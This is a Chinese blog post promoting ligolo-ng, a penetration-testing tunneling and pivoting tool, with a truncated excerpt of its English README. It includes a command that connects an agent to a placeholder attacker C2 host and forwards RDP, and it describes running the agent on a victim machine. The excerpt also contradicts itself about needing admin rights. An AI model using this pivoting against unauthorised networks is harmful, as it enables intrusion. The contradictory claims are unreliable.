---
layout: post
title: GitHub 开源项目 nicocha30/ligolo-ng 介绍，An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.
tags: Go
---

大家好，又见面了，我是 GitHub 精选君！

今天要给大家推荐一个 GitHub 开源项目 nicocha30/ligolo-ng，该项目在 GitHub 有超过 1.5k Star，用一句话介绍该项目就是：“An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.”。


![Ligolo Logo](https://raw.githubusercontent.com/nicocha30/ligolo-ng/master/doc/logo.png)



o> SESSION
  0  -  nchatelain@nworkstation
ligolo> SELECT 0
```

Enjoy your tunnel!

### Agent Binding/Listening

The *agent* can listen/bind to a local port and forward the data to the *proxy*. 

```shell
$ ./agent.exe -proxy attacker_c2_server.com:11601 -listen 3389:X.X.X.X:3389
```

### Access to agent's local ports (127.0.0.1)

The *agent* requires Administrator privileges on Windows, or root privileges on Linux to be able to listen/bind to local ports (127.0.0.1)

### Demo

Here's a [demo](https://github.com/nicocha30/ligolo-ng) of **Ligolo-ng** in action.

## Does it require Administrator/root access ?

**Ligolo-ng** does not require Administrator/root access to operate.

## Supported protocols/packets

**Ligolo-ng** supports the following protocols/packets: TCP, UDP, ICMP.

It does not currently support any Layer 7 protocols (HTTP, FTP, SSH, etc...).

## Performance

**Ligolo-ng** offers high performance through the use of multiplexing for packet transmission.

## Caveats

**Ligolo-ng** is designed for pentesters ONLY and any misuse is solely the user's responsibility.

## Todo

- Support for IPv6
- Support for proxychains
- Support for multi-user/multi-agent management
- Implement more advanced features such as : static routes, firewall rules...

## Credits

**Ligolo-ng** was designed and developed by **Nicolas Chatelain**. It was inspired by previous projects such as `Ligolo` , `Chisel` and `Meterpreter`.

### 背景介绍：

在我们的网络渗透测试过程中，通常需要借助于一些特殊的工具来建立隧道连接，安全地传输数据。传统的隧道工具可能需要一些高权限和复杂的设置。实际上，这个过程经常需要配置 SOCKS 代理，然而，有时候代理可能会增加配置的复杂性，限制工具的选用，甚至影响连接的性能。

### 项目介绍：

Ligolo-ng 是一个先进而简单的隧道/连接工具，它的工作原理是利用 TUN 接口。它是一款网络渗透测试工具，既简单（无需 SOCKS 代理），又轻量快捷。Ligolo-ng 不同于其他隧道工具，例如 Ligolo、Chisel 和 Meterpreter，使用 TUN 接口而非 SOCSK 代理或 TCP/UDP转发，从而极大地简化了操作和提高了性能。其核心理念是，通过在 userland 网络堆栈上使用 Gvisor，可以启动工具，如 nmap，无需使用 proxychains，使操作更简单，速度更快。Ligolo-ng 提供了高效的多路复用数据包传输方式，并且不需要高权限。

### 如何使用：

Ligolo-ng 提供了适用于 Windows、Linux 和 macOS 的预编译二进制文件，因此在大部分情况下，你可以下载适用于你的操作系统的预编译版。如果你需要自行构建，只需使用 Go 构建命令即可。在 Linux 系统中使用时，还需要创建一个 tun 接口。在 Windows 系统中，需要提前下载并安装 Wintun 驱动程序。使用过程中，首先必须在控制服务器上启动 proxy 服务器，默认端口为 11601。在目标（受害者）计算机上启动 agent，将连接到控制服务器，并在控制服务器上显示一个 session。选择需要的 session，就可以开始使用你的隧道了。

### 项目推介：

Ligolo-ng 当前在 GitHub 上的活跃状态良好，作者 nicocha30 是一位热爱开源并且有着丰富网络安全经验的开发者，该项目已累积了一定的关注度和使用者。Ligolo-ng的性能卓越，易用性较


以下是该项目 Star 趋势图（代表项目的活跃程度）：

![](https://api.star-history.com/svg?repos=nicocha30/ligolo-ng&type=Timeline)

更多项目详情请查看如下链接。

开源项目地址：https://github.com/nicocha30/ligolo-ng 

开源项目作者：nicocha30

开源协议：GNU General Public License v3.0

以下是参与项目建设的所有成员：

![](https://contrib.rocks/image?repo=nicocha30/ligolo-ng)

关注我们，一起探索有意思的开源项目。

